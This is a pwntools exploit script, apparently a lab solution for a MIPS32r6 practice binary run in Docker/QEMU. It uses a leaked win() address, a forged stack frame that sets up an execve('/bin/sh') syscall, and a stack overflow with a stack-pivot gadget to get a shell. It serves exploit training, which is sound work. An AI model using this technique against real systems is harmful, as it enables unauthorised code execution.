from pwn import *


# initialize the binary
build = 'mipsel32r6-glibc'
binary = "mips32r6le_no_pie_o32"
elf = context.binary = ELF("../binaries/"+binary, checksec=False)
docker = ELF('/usr/bin/docker',checksec=False)

gs = """
set architecture mips:isa32r6
break main
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = docker.process(['run','-i','--rm','-v','../binaries:/target/ctf','-p','1234:1234','--name',binary,f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','-g','1234','/ctf/'+binary])
    print("Remote debugging started...")
    gdb.attach(("127.0.0.1",1234), gdbscript=gs, exe="../binaries/"+binary)
else:
    p = docker.process(['run','-i','--rm','-v','../binaries:/target/ctf','--name',binary,f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','/ctf/'+binary])


### EXPLOIT ###
SYS_EXECVE = 4011

# get win() leak
win_addr = int(p.readline().strip(),16)
print(f'win(): {hex(win_addr)}')

# fill "new stack" with data needed to exec "/bin/sh"
new_stack = flat(
    p32(0),                                 # sp
    p32(elf.sym['win']+12),                 # skip win() function prologue
    p32(next(elf.search(b'/bin/sh\x00'))),  # a0
    p32(0),                                 # a1
    p32(0),                                 # a2
    p32(SYS_EXECVE),                        # v0 (sys_execve)
).ljust(0x40, b'a')
p.send(new_stack)

# exploit stack overflow
payload = flat(
    # padding
    b'a'*0x20,
    p32(elf.sym['global_buf']-0x38),

    # stack pivot gadget
    elf.sym['vuln']+64,                     # move sp,s8
)
p.sendline(payload)
p.interactive()


### CLEANUP ###
print('[+] Removing docker container...')
subprocess.getoutput('docker stop ' + binary+' && docker rm ' + binary)